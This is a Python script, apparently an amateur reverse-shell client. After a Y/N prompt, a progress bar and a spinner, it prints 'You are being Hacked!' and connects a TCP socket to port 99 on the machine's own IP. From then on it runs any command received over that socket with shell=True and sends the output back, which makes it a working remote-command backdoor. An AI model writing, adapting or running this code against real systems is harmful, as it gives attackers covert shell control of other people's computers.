import socket
import os
import subprocess
import time
#0
print("Your shell is going to be executed reversing shell ?")
def ask() :
    inp = input("Y/N ? ").strip()
    return inp

def printProgressBar (iteration, total, prefix = '', suffix = '', decimals = 1, length = 100, fill = '█', printEnd = "\r"):
    """
    Call in a loop to create terminal progress bar
    @params:
        iteration   - Required  : current iteration (Int)
        total       - Required  : total iterations (Int)
        prefix      - Optional  : prefix string (Str)
        suffix      - Optional  : suffix string (Str)
        decimals    - Optional  : positive number of decimals in percent complete (Int)
        length      - Optional  : character length of bar (Int)
        fill        - Optional  : bar fill character (Str)
        printEnd    - Optional  : end character (e.g. "\r", "\r\n") (Str)
    """
    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)
    print('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix), end = printEnd)
    # Print New Line on Complete
    if iteration == total: 
        print()

inp = ask()
if inp == "N" :
    exit(0)
if inp != "Y" : 
    print("what do u mean?")
    ask()

# A List of Items
items = list(range(0, 20))
l = len(items)

# Initial call to print 0% progress
printProgressBar(0, l, prefix = 'Progress:', suffix = 'Complete', length = 50)
for i, item in enumerate(items):
    # Do stuff...
    time.sleep(0.05)
    # Update Progress Bar
    printProgressBar(i + 1, l, prefix = 'Progress:', suffix = 'Complete', length = 50)
import time
import sys


animation = "|/-\\"

for i in range(10000):
    if i < 10 :
        time.sleep(0.1)
    elif i < 20 :
        time.sleep(0.01)
    elif i < 40 :
        time.sleep(0.005)
    elif i < 70 :
        time.sleep(0.001)
    elif i < 80 :
        time.sleep(0.005)
    elif i < 90 :
        time.sleep(0.001)
    elif i < 100 : 
        time.sleep(0.0005)
    sys.stdout.write("\r" + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)] + animation[i % len(animation)] + animation[(i+1) % len(animation)] + animation[(i+2) % len(animation)] + animation[(i+3) % len(animation)])
    sys.stdout.flush()
print("You are being Hacked!")
hostname = socket.gethostname()    
IPAddr = socket.gethostbyname(hostname)    
print("Your target host is:" + hostname)    
print("Your target IP Address is:" + IPAddr)   
target_host = IPAddr
target_port = 99
#2
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((target_host,target_port))
#3
while True:
    data = client.recv(1024)
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
        output_bytes = cmd.stdout.read()
        output_str = str(output_bytes, "utf-8")
        client.send(str.encode(output_str + str(os.getcwd()) + '$'))
        print(data[:].decode("utf-8"))
client.close()